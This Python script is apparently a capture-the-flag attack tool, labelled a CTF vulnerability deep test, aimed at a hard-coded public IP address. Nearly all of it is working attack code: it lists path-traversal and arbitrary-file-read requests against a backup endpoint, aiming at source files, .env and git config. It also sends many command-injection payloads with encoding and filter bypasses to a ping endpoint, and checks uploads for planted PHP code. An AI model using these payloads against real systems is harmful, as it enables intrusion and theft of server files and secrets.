import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def print_section(title):
    print("\n" + "=" * 70)
    print(f"  {title}")
    print("=" * 70)


def test_backup_read_files():
    """测试Backup功能读取服务器文件"""
    print_section("1. Backup功能读取文件")
    
    backup_url = f"{TARGET}/backup"
    
    files_to_read = [
        # 应用文件
        "F:\\small peoject\\python-lab\\app.py",
        "F:\\small peoject\\python-lab\\main.py",
        "F:\\small peoject\\python-lab\\config.py",
        "F:\\small peoject\\python-lab\\server.py",
        "F:\\small peoject\\python-lab\\flag.txt",
        "F:\\small peoject\\python-lab\\flag",
        "F:\\small peoject\\python-lab\\secret.txt",
        "F:\\small peoject\\python-lab\\database.db",
        "F:\\small peoject\\python-lab\\.env",
        "F:\\small peoject\\python-lab\\.git\\config",
        # 根目录
        "F:\\flag.txt",
        "F:\\flag",
        "F:\\secret.txt",
        "F:\\ctf.txt",
        "C:\\flag.txt",
        "C:\\flag",
        "C:\\secret.txt",
        # 当前目录
        "F:\\small peoject\\python-lab\\uploads\\29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "F:\\small peoject\\python-lab\\uploads\\4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "F:\\small peoject\\python-lab\\uploads\\572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "F:\\small peoject\\python-lab\\uploads\\61bc40d368b2450291587e2b0ab9d9d6.jpg",
        "F:\\small peoject\\python-lab\\uploads\\a85c63eb5a0f4597832927bc2657d085.jpg",
        "F:\\small peoject\\python-lab\\uploads\\b509b272988e45798fdf8e0004830e43.jpg",
        "F:\\small peoject\\python-lab\\uploads\\b55ba29d54334b9ab42b35c618128fcf.png",
        "F:\\small peoject\\python-lab\\uploads\\d0fa8509503c438a872c3364419d210c.gif",
        "F:\\small peoject\\python-lab\\uploads\\e09ee5dc21394c2583c6e45c511986f0.gif",
        "F:\\small peoject\\python-lab\\uploads\\ed9555cdf5214792babce29abc5e1777.gif",
        "F:\\small peoject\\python-lab\\uploads\\f18b686e69c946918595e313bafc9ee1.gif",
        # 路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..\\app.py",
        "F:\\small peoject\\python-lab\\uploads\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\flag.txt",
    ]
    
    for path in files_to_read:
        try:
            r = session.get(backup_url, params={"path": path}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={path}")
                        print(f"     响应: {body_content[:800]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_ping_encoding():
    """测试Ping命令执行（编码绕过）"""
    print_section("2. Ping命令执行（编码绕过）")
    
    ping_url = f"{TARGET}/ping"
    
    # 尝试各种编码方式
    ping_payloads = [
        # URL编码分号
        "127.0.0.1%3Btype F:\\flag.txt",
        "127.0.0.1%3Bwhoami",
        "127.0.0.1%3Bdir F:\\",
        # 双重编码
        "127.0.0.1%253Btype F:\\flag.txt",
        # Unicode编码
        "127.0.0.1\u003Btype F:\\flag.txt",
        # HTML实体编码
        "127.0.0.1&#59;type F:\\flag.txt",
        # 尝试不同的命令分隔符
        "127.0.0.1,type F:\\flag.txt",
        "127.0.0.1|type F:\\flag.txt",
        "127.0.0.1||type F:\\flag.txt",
        "127.0.0.1&&type F:\\flag.txt",
        "127.0.0.1;&&type F:\\flag.txt",
        "127.0.0.1;&type F:\\flag.txt",
        # 尝试不使用空格
        "127.0.0.1;type%20F:\\flag.txt",
        "127.0.0.1;type\tF:\\flag.txt",
        "127.0.0.1;type`F:\\flag.txt`",
        # 尝试使用命令别名
        "127.0.0.1;cmd/c type F:\\flag.txt",
        "127.0.0.1;cmd /c type F:\\flag.txt",
        "127.0.0.1;powershell type F:\\flag.txt",
        # 尝试读取文件的其他方式
        "127.0.0.1;more F:\\flag.txt",
        "127.0.0.1;findstr . F:\\flag.txt",
        "127.0.0.1;for %f in (F:\\flag.txt) do type %f",
        # 尝试使用变量
        "127.0.0.1;set p=F:\\flag.txt&&type %p%",
        "127.0.0.1;%comspec% /c type F:\\flag.txt",
        # 尝试绕过空格过滤
        "127.0.0.1;type%09F:\\flag.txt",
        "127.0.0.1;type%0aF:\\flag.txt",
        "127.0.0.1;type${IFS}F:\\flag.txt",
        # 尝试使用括号
        "(127.0.0.1);type F:\\flag.txt",
        "127.0.0.1;(type F:\\flag.txt)",
    ]
    
    for payload in ping_payloads:
        try:
            r = session.get(ping_url, params={"host": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 100:
                        print(f"\n  [{r.status_code}] ?host={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_backup_encoding():
    """测试Backup命令执行（编码绕过）"""
    print_section("3. Backup命令执行（编码绕过）")
    
    backup_url = f"{TARGET}/backup"
    
    backup_payloads = [
        # URL编码分号
        "F:\\small peoject\\python-lab\\uploads%3Btype F:\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads%3Bwhoami",
        # 尝试路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..",
        "F:\\small peoject\\python-lab\\uploads/..",
        "F:\\small peoject\\python-lab\\uploads\\..\\..",
        "F:\\small peoject\\python-lab\\uploads/../../",
        # 尝试绝对路径遍历
        "../../../flag.txt",
        "../flag.txt",
        "./../flag.txt",
        # 尝试使用UNC路径
        "\\\\localhost\\c$\\flag.txt",
        "\\\\127.0.0.1\\c$\\flag.txt",
        # 尝试使用环境变量
        "%SYSTEMDRIVE%\\flag.txt",
        "%TEMP%\\flag.txt",
        "%APPDATA%\\flag.txt",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            print(f"  错误: {e}")


def test_uploaded_files():
    """测试上传的文件是否包含敏感信息"""
    print_section("4. 测试上传的文件内容")
    
    uploaded_files = [
        "/uploads/29c62af68a5c4e12aa8b28be5f41f9df_test.php.jpg",
        "/uploads/4f7105e4ac734f13ab9e1cdaad24128d.gif",
        "/uploads/572279e9bc5c4cf79d754e57fb2e38bf.gif",
        "/uploads/61bc40d368b2450291587e2b0ab9d9d6.jpg",
        "/uploads/a85c63eb5a0f4597832927bc2657d085.jpg",
        "/uploads/b509b272988e45798fdf8e0004830e43.jpg",
        "/uploads/b55ba29d54334b9ab42b35c618128fcf.png",
        "/uploads/d0fa8509503c438a872c3364419d210c.gif",
        "/uploads/e09ee5dc21394c2583c6e45c511986f0.gif",
        "/uploads/ed9555cdf5214792babce29abc5e1777.gif",
        "/uploads/f18b686e69c946918595e313bafc9ee1.gif",
    ]
    
    for path in uploaded_files:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:500]
                
                print(f"\n  [{r.status_code}] {path}")
                print(f"     Content-Type: {r.headers.get('Content-Type', '')}")
                
                # 检查是否包含PHP代码
                if "<?php" in content.lower() or "<?=" in content.lower():
                    print(f"     ⚠️ 包含PHP代码")
                # 检查是否包含Python代码
                if "import os" in content or "system(" in content.lower() or "exec(" in content.lower():
                    print(f"     ⚠️ 包含Python代码")
                # 检查是否包含flag
                flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                if flag_match:
                    print(f"     🚩 FLAG FOUND: {flag_match.group(0)}")
                    return
                    
                # 如果是二进制文件，尝试读取文本内容
                if len(content) < 100:
                    raw_content = r.content[:500].decode('utf-8', errors='replace')
                    print(f"     内容: {raw_content}")
                    
        except Exception as e:
            print(f"  错误: {e}")


def main():
    print("*" * 70)
    print("  CTF漏洞深度测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    test_backup_read_files()
    test_ping_encoding()
    test_backup_encoding()
    test_uploaded_files()
    
    print_section("测试完成")


if __name__ == "__main__":
    main()